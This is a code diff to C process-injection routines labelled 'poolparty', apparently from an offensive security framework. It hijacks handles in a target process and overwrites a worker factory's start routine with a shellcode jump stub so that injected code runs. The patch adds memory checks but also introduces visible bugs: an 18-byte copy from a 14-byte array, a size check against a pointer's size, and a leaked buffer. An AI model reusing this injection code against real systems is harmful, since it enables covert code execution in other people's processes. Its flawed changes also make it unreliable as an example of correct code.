@@ -169,7 +169,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	}
 	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	if(lpProcessInfo == NULL) {
-		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc() returned NULL");
+		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc() for lpProcessInfo returned NULL");
 		return INVALID_HANDLE_VALUE;
 	}
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
@@ -179,7 +179,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 		if (ntStatus == STATUS_INFO_LENGTH_MISMATCH && dwInformationSizeIn != dwInformationSizeOut) {
 			lpProcessInfo = HeapReAlloc(hHeap, 0, lpProcessInfo, dwInformationSizeOut);
 			if(lpProcessInfo == NULL) {
-				dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc() returned NULL");
+				dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc() for lpProcessInfo returned NULL");
 				return INVALID_HANDLE_VALUE;
 			}
 			dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc lpProcessInfo: %p", lpProcessInfo);
@@ -195,6 +195,10 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	dwInformationSizeIn = 2048;
 	dwInformationSizeOut = 0;
 	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
+	if (lpObjectInfo == NULL) {
+		dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapAlloc for lpObjectInfo returned NULL");
+		return INVALID_HANDLE_VALUE;
+	}
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
 	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
 		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
@@ -203,6 +207,16 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
 					break;
 				}
+			}
+			else if (dwInformationSizeOut > dwInformationSizeIn) {
+				lpObjectInfo = HeapReAlloc(hHeap, 0, lpObjectInfo, dwInformationSizeOut);
+				if (lpObjectInfo == NULL) {
+					dprintf("[INJECT][inject_via_poolparty][get_remote_handle] HeapReAlloc for lpObjectInfo returned NULL");
+					return INVALID_HANDLE_VALUE;
+				}
+				dwInformationSizeIn = dwInformationSizeOut;
+				pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut); // get the whole context this time...
+				if (!lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer)) { break; }
 			}
 			CloseHandle(hHijackHandle);
 		}
@@ -287,18 +301,21 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory failed.",ERROR_NOT_SUPPORTED);
 		}
-		unsigned char shellcode[18];
+		unsigned char* shellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 18);
+		if (shellcode == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] shellcode is NULL", ERROR_NOT_SUPPORTED);
+		}
 		if (dwDestinationArch == PROCESS_ARCH_X64) {
 			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 			uintptr_t StubAddress = (uintptr_t)lpStartAddress;
-			memcpy(&tmp[10], &StubAddress, sizeof(StubAddress));
-			memcpy(shellcode, tmp, sizeof(tmp));
+			memcpy(shellcode, &tmp, 18);
+			memcpy(shellcode + 10, &StubAddress, sizeof(StubAddress));
 		}
 		else {
 			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};
 			unsigned __int32 StubAddress = (unsigned __int32)((uintptr_t)lpStartAddress);
-			memcpy(&tmp[10], &StubAddress, sizeof(StubAddress));
-			memcpy(shellcode, tmp, sizeof(tmp));
+			memcpy(shellcode, &tmp, 18);
+			memcpy(shellcode + 10, &StubAddress, sizeof(StubAddress));
 		}
 		unsigned char OriginalBytes[18] = { 0x00 };
 		if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), NULL)) {
@@ -306,7 +323,7 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		}
 		
 		SIZE_T szWritten = 0;
-		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &shellcode, sizeof(shellcode), &szWritten) || szWritten != sizeof(shellcode)) {
+		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, shellcode, 18, &szWritten) || szWritten != sizeof(shellcode)) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
 		}
 		WorkerFactoryBasicInfo.ThreadMinimum++; //Increase minimum thread number to create a new thread.
